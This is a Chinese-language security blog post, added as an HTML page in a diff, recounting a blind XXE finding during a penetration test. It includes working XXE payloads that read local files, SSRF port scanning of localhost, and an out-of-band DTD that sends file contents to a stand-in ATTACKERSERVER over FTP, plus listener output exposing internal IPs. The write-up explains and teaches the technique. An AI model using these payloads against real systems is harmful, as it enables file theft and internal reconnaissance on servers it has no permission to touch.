@@ -1,0 +1,1036 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="xxe," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/uploads/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="在进入正文前，我想告诉大家，文章没有涉及任何XXE攻击的任何新技巧，这只是我遇到的一个案例，我只想分享给大家。 简短的摘要是非常重要的：  在对后台一无所知的情况下发现了一个XXE漏洞，该漏洞没有返回任何数据或者文件，这就是盲打XXE 使用盲打XXE进行基于报错的端口扫描 成功的外部交互正常进行 充分利用了盲打XXE识别了后端系统的文件  身为渗透测试人员，我每天都的学习都很充实，有的来自喜爱的阅">
+<meta name="keywords" content="xxe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="黑夜的猎杀-盲打XXE">
+<meta property="og:url" content="/2017/07/10/blind-xxe-learning/index.html">
+<meta property="og:site_name" content="Ꭰ&#39;s security blog">
+<meta property="og:description" content="在进入正文前，我想告诉大家，文章没有涉及任何XXE攻击的任何新技巧，这只是我遇到的一个案例，我只想分享给大家。 简短的摘要是非常重要的：  在对后台一无所知的情况下发现了一个XXE漏洞，该漏洞没有返回任何数据或者文件，这就是盲打XXE 使用盲打XXE进行基于报错的端口扫描 成功的外部交互正常进行 充分利用了盲打XXE识别了后端系统的文件  身为渗透测试人员，我每天都的学习都很充实，有的来自喜爱的阅">
+<meta property="og:image" content="/2017/07/10/blind-xxe-learning/PORTSCAN_Blog_setup.png">
+<meta property="og:image" content="/2017/07/10/blind-xxe-learning/payload_blog_setup.png">
+<meta property="og:image" content="/2017/07/10/blind-xxe-learning/open_ports.PNG">
+<meta property="og:updated_time" content="2017-07-10T02:12:27.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="黑夜的猎杀-盲打XXE">
+<meta name="twitter:description" content="在进入正文前，我想告诉大家，文章没有涉及任何XXE攻击的任何新技巧，这只是我遇到的一个案例，我只想分享给大家。 简短的摘要是非常重要的：  在对后台一无所知的情况下发现了一个XXE漏洞，该漏洞没有返回任何数据或者文件，这就是盲打XXE 使用盲打XXE进行基于报错的端口扫描 成功的外部交互正常进行 充分利用了盲打XXE识别了后端系统的文件  身为渗透测试人员，我每天都的学习都很充实，有的来自喜爱的阅">
+<meta name="twitter:image" content="/2017/07/10/blind-xxe-learning/PORTSCAN_Blog_setup.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="/2017/07/10/blind-xxe-learning/"/>
+
+
+
+
+
+  <title>黑夜的猎杀-盲打XXE | Ꭰ's security blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ca5988953450620ca8c294ff5c390a4a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ꭰ's security blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="/2017/07/10/blind-xxe-learning/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="oTex911">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/header.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ꭰ's security blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">黑夜的猎杀-盲打XXE</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-10T10:12:27+08:00">
+                2017-07-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pentest/" itemprop="url" rel="index">
+                    <span itemprop="name">pentest</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pentest/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/07/10/blind-xxe-learning/" class="leancloud_visitors" data-flag-title="黑夜的猎杀-盲打XXE">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在进入正文前，我想告诉大家，文章没有涉及任何XXE攻击的任何新技巧，这只是我遇到的一个案例，我只想分享给大家。</p>
+<p>简短的摘要是非常重要的：</p>
+<ul>
+<li>在对后台一无所知的情况下发现了一个XXE漏洞，该漏洞没有返回任何数据或者文件，这就是盲打XXE</li>
+<li>使用盲打XXE进行基于报错的端口扫描</li>
+<li>成功的外部交互正常进行</li>
+<li>充分利用了盲打XXE识别了后端系统的文件</li>
+</ul>
+<p>身为渗透测试人员，我每天都的学习都很充实，有的来自喜爱的阅读，有的来自工作。每天都像是在学校的生活，我总是能遇到一些以前见过的东西，但它的实现是不一样的。这次的案例是客户端的请求数据为JSON格式，只要改变<code>content-type</code>为XMl，服务器就会处理XML实体，然后服务器会根据收到的请求内容返回不同的错误。</p>
+<h1 id="你对XXE了解吗？"><a href="#你对XXE了解吗？" class="headerlink" title="你对XXE了解吗？"></a>你对XXE了解吗？</h1><p>无论读者是研究过xxe的或对此一无所知的，不要担心，下面这段文字（摘自OWASP）将为你做简短的描述，从而有助接下来的阅读。</p>
+<blockquote>
+<p>XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。</p>
+</blockquote>
+<p>如果你没有明白owasp的通用描述，没关系。其实XXE就是在说你向应用程序发送了恶意的XML内容，接着应用程序因为处理你的恶意请求导致信息泄漏。除了可能导致信息泄漏外，还可能引起本地文件包含（LFI），远程代码执行（RCE），拒绝服务攻击（DoS），服务器请求伪造（SSRF）和其他类型的攻击。上述谈到的类型是渗透测试中应关注的重点。</p>
+<p>XXE本质上是另一种类型的注入攻击，如果恰当利用危害也非常大。这篇文章将以问题的形式来讲述我最近一次渗透测试遇到的问题和之后一次赏金之旅（漏洞奖励项目）中的发现，其实这两次的问题本质上都是因为应用在XML输入的处理上没有充分过滤。</p>
+<h1 id="最初的发现"><a href="#最初的发现" class="headerlink" title="最初的发现"></a>最初的发现</h1><p>在一次渗透测试中，我将数据格式为JSON的POST请求的Content-type改成了XML，那是我第一次怀疑服务器能够处理XML文档。下面这个请求是一个例子：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">POST /broken/api/confirm HTTP/1.1  </div><div class="line">Host: example.com  </div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0  </div><div class="line">Content-Type: application/xml;charset=UTF-8</div><div class="line"></div><div class="line"></div><div class="line">[&#123;&#125;]</div></pre></td></tr></table></figure>
+<p>与请求对应的响应如下，返回了Java错误。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">javax.xml.bind.UnmarshalException  </div><div class="line"> - with linked exception:</div><div class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</div><div class="line">Exception Description: An error occurred unmarshalling the document</div></pre></td></tr></table></figure>
+<p>从返回的错误来看，可以得知后台处理了收到的XML，同时因为在处理提取的内容时发生了问题所以导致了响应错误。与应用的其他响应对比可知，这个响应算是奇怪的代表了，因为其他的响应返回都是<code>True</code>或<code>False</code>。</p>
+<h1 id="继续前行"><a href="#继续前行" class="headerlink" title="继续前行"></a>继续前行</h1><p>接下来对于我来说，自然是反复尝试发送不同类型的内容给服务器，观察应用程序是如何响应的。所以，我一开始选择了发送普通的XML攻击载荷去试水，同时校验之前的错误不是偶然发生的。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /broken/api/confirm HTTP/1.1  </div><div class="line">Host: example.com  </div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0  </div><div class="line">Content-Type: application/xml;charset=UTF-8</div><div class="line"></div><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div></pre></td></tr></table></figure>
+<p>我再次向应用程序发出请求，得到的错误响应和之前的略微有些不同，多了一些关于错误的上下文环境。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">javax.xml.bind.UnmarshalException  </div><div class="line"> - with linked exception:</div><div class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</div><div class="line">Exception Description: An error occurred unmarshalling the document  </div><div class="line">Internal Exception: ████████████████████████: Unexpected EOF in prolog  </div><div class="line"> at [row,col &#123;unknown-source&#125;]: [3,0]]</div></pre></td></tr></table></figure>
+<p>这个现象证明了我的猜测（应用程序能够处理XML输入）。除此之外，这个错误响应也证明了服务器认为data数据是意外终止的（data数据不完整），这意味服务器希望收到的POST请求中包含更多的XML信息。</p>
+<h1 id="开始猎杀"><a href="#开始猎杀" class="headerlink" title="开始猎杀"></a>开始猎杀</h1><p>猎杀从这里开始了。对于大多数人来说，两次错误之间的差异已经足够证明一些东西了。然而，这对于我来说是远远不够的，我想看看通过这些差异能深入多少，还有什么我没发现的信息。所以我使用了一个普通的XXE攻击载荷去探索本地文件。</p>
+<p>攻击载荷如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;  </div><div class="line">&lt;!DOCTYPE test [  </div><div class="line">&lt;!ENTITY % a SYSTEM "file:///etc/passwd"&gt;  </div><div class="line">%a;</div><div class="line">]&gt;</div></pre></td></tr></table></figure>
+<p>令人沮丧的是应用程序的返回依然是普通的错误，和之前的EOF错误相似。所以，我不得不深挖找出服务器的信息，为此选择了SSRF。</p>
+<p>SSSRF是一类基本的攻击，攻击者通过向应用程序发送精心构造的请求来触发服务器行为。如果充分利用的话可以实施端口扫描，有些情况甚至能执行远程代码。</p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>在前面的本地文件探索费了些时间后，我写了一个攻击载荷用于SSRF，攻击载荷中的XML就是用来探测服务器上指定的端口，目的是判断本地（127.0.0.1）端口的情况。</p>
+<p>攻击载荷如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;  </div><div class="line">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  </div><div class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </div><div class="line">]&gt;</div><div class="line">&lt;data&gt;4&lt;/data&gt;</div></pre></td></tr></table></figure>
+<p>哈哈，接下来时刻真令人鼓舞。应用程序返回了另外一种错误，这次的错误（connection refused）在某种程度上是有意义的。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">javax.xml.bind.UnmarshalException  </div><div class="line"> - with linked exception:</div><div class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</div><div class="line">Exception Description: An error occurred unmarshalling the document  </div><div class="line">Internal Exception: ████████████████████████: Connection refused</div></pre></td></tr></table></figure>
+<p>那这到底是什么意义呢？很明显这意味着应用程序完全能解析带有XML内容的请求，那本地主机的端口扫描呢？哇哦，都说到了这，是时候使用burp的intruder。</p>
+<p><img src="/2017/07/10/blind-xxe-learning/PORTSCAN_Blog_setup.png" alt="PORTSCAN_Blog_setup"></p>
+<p>将攻击点设为端口和URL协议，添加制作有效载荷:</p>
+<ul>
+<li>1) URL协议列表（HTTP、HTTPS和FTP）</li>
+<li>2) 这种情况下，进行全端口（0-65535）扫描。</li>
+</ul>
+<p><img src="/2017/07/10/blind-xxe-learning/payload_blog_setup.png" alt="payload_blog_setup"></p>
+<p>完成上面的攻击需要花些时间，因为这大概需要发送20w请求（端口数xURL协议）。</p>
+<p><img src="/2017/07/10/blind-xxe-learning/open_ports.PNG" alt="open_ports"></p>
+<p>过了会儿，我根据长度将响应排序发现8080端口（HTTP和HTTPS）似乎是开放的，接着对这两个响应进行了仔细的观察确认了内容不同，这暗示着这些端口实际就是开放的。</p>
+<p>这是8080端口的HTTP的响应包：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">javax.xml.bind.UnmarshalException  </div><div class="line"> - with linked exception:</div><div class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</div><div class="line">Exception Description: ████████████████████████: Unrecognized DTD directive '&lt;!DOCTYPE &gt;'; expected ATTLIST, ELEMENT, ENTITY or NOTATION (or, for DTD++, TARGETNS)  </div><div class="line"> at [row,col,system-id]: [1,9,"http://127.0.0.1:8080/"]</div><div class="line"> from [row,col &#123;unknown-source&#125;]: [1,1]]</div></pre></td></tr></table></figure>
+<p>这是8080端口的HTTPS的响应包：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">javax.xml.bind.UnmarshalException  </div><div class="line"> - with linked exception:</div><div class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</div><div class="line">Exception Description: An error occurred unmarshalling the document  </div><div class="line">Internal Exception: ████████████████████████: Unrecognised SSL message, plaintext connection?]</div></pre></td></tr></table></figure>
+<p>从HTTP响应来看，我发现与之前返回的<code>Connection Refused</code>不同，这次是另一个错误，暗示着端口开放。从HTTPS响应来看，该响应的内容也表明了端口是开放的，通信是在纯文本协议上进行的而不是SSL。</p>
+<p>按照目前的逻辑，下一步很自然想到内网端口扫描，但这个时候我并不知道内网IP是多少，所以端口扫描被搁置了，我转向去鉴定服务器的对外访问了。</p>
+<h1 id="外交"><a href="#外交" class="headerlink" title="外交"></a>外交</h1><p>除了端口扫描，控制服务器对外网站发送请求是有可能的，所以我在自己的服务器使用了 <a href="https://nmap.org/ncat" target="_blank" rel="external">ncat</a>。我认为NCAT比netcat稍微好用一些，因为它给出了关于成功连接的更详细信息，同时它和netcat的标志一致，这非常棒。</p>
+<p>我用了下面的命令在自己的服务器上进行监听：</p>
+<p><code>ncat -lvkp 8090</code></p>
+<ul>
+<li><code>-l</code>启用ncat的监听模式</li>
+<li><code>v</code>启用详情输出模式</li>
+<li><code>k</code>在成功连接后确保连接的存活</li>
+<li><code>p</code>指定监听的端口</li>
+</ul>
+<p>如果你对ncat感兴趣，你可以查看它的<a href="http://man7.org/linux/man-pages/man1/ncat.1.html" target="_blank" rel="external">官方手册</a></p>
+<p>监听器安置妥当后，下一步将检测应用服务器能否和我的服务器建立链接。我将使用下面的请求来完成这个测试（如果没有vps或服务器，可以使用<em>burp</em> <em>collaborator</em>）:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">POST /broken/api/confirm HTTP/1.1  </div><div class="line">Host: example.com  </div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0  </div><div class="line">Content-Type: application/xml;charset=UTF-8</div><div class="line"></div><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;  </div><div class="line">&lt;!DOCTYPE data SYSTEM "http://ATTACKERIP:8090/" [  </div><div class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </div><div class="line">]&gt;</div><div class="line">&lt;data&gt;4&lt;/data&gt;</div></pre></td></tr></table></figure>
+<p>注意上面请求的端口不是固定的，我选择8090端口是为了演示。无论什么情况下，只要请求发送成功了，自己的服务器应该都能收到下面的消息：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Ncat: Version 7.40 ( https://nmap.org/ncat )  </div><div class="line">Ncat: Listening on :::8090  </div><div class="line">Ncat: Listening on 0.0.0.0:8090  </div><div class="line">Ncat: Connection from ██████████████████.  </div><div class="line">GET / HTTP/1.1  </div><div class="line">Cache-Control: no-cache  </div><div class="line">Pragma: no-cache  </div><div class="line">User-Agent: Java/1.8.0_60  </div><div class="line">Host: ATTACKERHOST:8090  </div><div class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2  </div><div class="line">Connection: keep-alive</div></pre></td></tr></table></figure>
+<p>上述信息的关键包含了受害者服务器IP地址，仔细观察会发现这是一台亚马逊的web服务器实例。此外，请求的<code>ua</code>头是<code>Java/1.8.0_60</code>表明后台使用了java开发。另一种识别文件存在的攻击是针对服务器的OOB攻击。</p>
+<h1 id="带外攻击（OOB）"><a href="#带外攻击（OOB）" class="headerlink" title="带外攻击（OOB）"></a>带外攻击（OOB）</h1><h2 id="文件识别"><a href="#文件识别" class="headerlink" title="文件识别"></a>文件识别</h2><p>除了外部交互，还可以通过OOB请求的响应来识别服务器上文件的存在。所以我在OOB攻击使用了FTP协议来判别文件。</p>
+<p>下面这个请求已发送给应用程序，这里用来演示和测试。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /broken/api/confirm HTTP/1.1  </div><div class="line">Host: example.com  </div><div class="line">Content-Type: application/xml;charset=UTF-8  </div><div class="line">Content-Length: 132</div><div class="line"></div><div class="line">&lt;?xml version="1.0" ?&gt;  </div><div class="line">&lt;!DOCTYPE a [  </div><div class="line">&lt;!ENTITY % asd SYSTEM "http://ATTACKERSERVER:8090/xxe_file.dtd"&gt;  </div><div class="line">%asd;</div><div class="line">%c;</div><div class="line">]&gt;</div><div class="line">&lt;a&gt;&amp;rrr;&lt;/a&gt;</div></pre></td></tr></table></figure>
+<p>这个请求被受害者服务器解析后，将向攻击者服务器发送请求，请求攻击者精心构造带有payload的DTD文件，这种场景下的文件内容通常是下面这样的：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % d SYSTEM "file:///var/www/web.xml"&gt;  </div><div class="line">&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://ATTACKERSERVER:2121/%d;'&gt;"&gt;</div></pre></td></tr></table></figure>
+<p>这个攻击载荷（包含payload的请求）向攻击者服务器发出了第二个请求（第一个是面向受害者服务器的），请求的是一个DTD文件，其中包含了对目标服务器上另一个文件的请求。</p>
+<p>如果文件不存在，服务器将返回<code>No such file or directory</code>的响应。有些和下面的响应类似：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">javax.xml.bind.UnmarshalException  </div><div class="line"> - with linked exception:</div><div class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</div><div class="line">Exception Description: An error occurred unmarshalling the document  </div><div class="line">Internal Exception: ████████████████████████: (was java.io.FileNotFoundException) /var/www/index.html (No such file or directory)  </div><div class="line"> at [row,col,system-id]: [2,63,"http://ATTACKERSERVER:8090/xxe_file.dtd"]</div><div class="line"> from [row,col &#123;unknown-source&#125;]: [4,6]]</div></pre></td></tr></table></figure>
+<p>但如果文件确实存在，响应就不同了。</p>
+<p>因为我不知道root元素的名字，服务器返回了<code>A descriptor with default root element foo was not found in the project</code>错误。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">javax.xml.bind.UnmarshalException  </div><div class="line"> - with linked exception:</div><div class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</div><div class="line">Exception Description: An error occurred unmarshalling the document  </div><div class="line">Internal Exception: ████████████████████████  </div><div class="line">Exception Description: A descriptor with default root element foo was not found in the project]</div></pre></td></tr></table></figure>
+<p>如果知道关于root元素名字的信息，攻击将更可见，破坏也更具有效果。因为这很可能造成本地文件读取并且我敢保证存在RCE的风险！</p>
+<p>由于每个请求文件的响应不同，这一点对于攻击者来说是清晰可见的。所以攻击者可以对隐藏在应用程序背后的服务器有个大概的认知。</p>
+<h1 id="发现内网IP"><a href="#发现内网IP" class="headerlink" title="发现内网IP"></a>发现内网IP</h1><p>通过使用上文所讲述的带外技术，我收集了应用程序主机的内网IP信息。这些信息是通过FTP协议获得的，这是利用了Java从连接字符串中提取的信息。</p>
+<p>为了完成信息收集，我用了<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="external">xxe-ftp-server</a>，这个exp允许我在自定义的端口上进行监听和拦截。我将它安装了服务器上，监听着默认的2121端口。</p>
+<p>接着我向应用程序发送了下面这个请求，该请求会使应用程序服务器向指定的攻击者服务器发送FTP请求。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /broken/api/confirm HTTP/1.1  </div><div class="line">Host: example.com  </div><div class="line">Content-Type: application/xml;charset=UTF-8</div><div class="line"></div><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;  </div><div class="line">&lt;!DOCTYPE test [  </div><div class="line">  &lt;!ENTITY % one SYSTEM "ftp://ATTACKERHOST:2121/"&gt;</div><div class="line">  %one;</div><div class="line">  %two;</div><div class="line">  %four;</div><div class="line">  %five;</div><div class="line">]&gt;</div></pre></td></tr></table></figure>
+<p>在发送FTP请求前，需要在自己的服务器上运行FTP服务。下面的结果展示了请求发给服务器时的情况。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ruby xxe-ftp-server.rb  </div><div class="line">FTP. New client connected  </div><div class="line">&lt; USER anonymous  </div><div class="line">&lt; PASS Java1.8.0_60@  </div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; TYPE A  </div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; EPSV ALL  </div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; EPSV  </div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; EPRT |1|10.10.13.37|38505|  </div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; LIST  </div><div class="line">&lt; PORT 10,10,13,37,150,105  </div><div class="line">! PORT received</div><div class="line">&gt; 200 PORT command ok</div><div class="line">&lt; LIST</div></pre></td></tr></table></figure>
+<p>接着分解上面的输出，目标应用程序向接受登录请求的FTP服务器发送请求。登录请求中包含了Java版本和服务器内网IP和端口信息。这暗示了两件事情，1）内网网段范围很可能是<strong>10.10.x.x</strong>。2）从内网到外网出口似乎没有任何过滤，如果获得一个shell这将非常有用。</p>
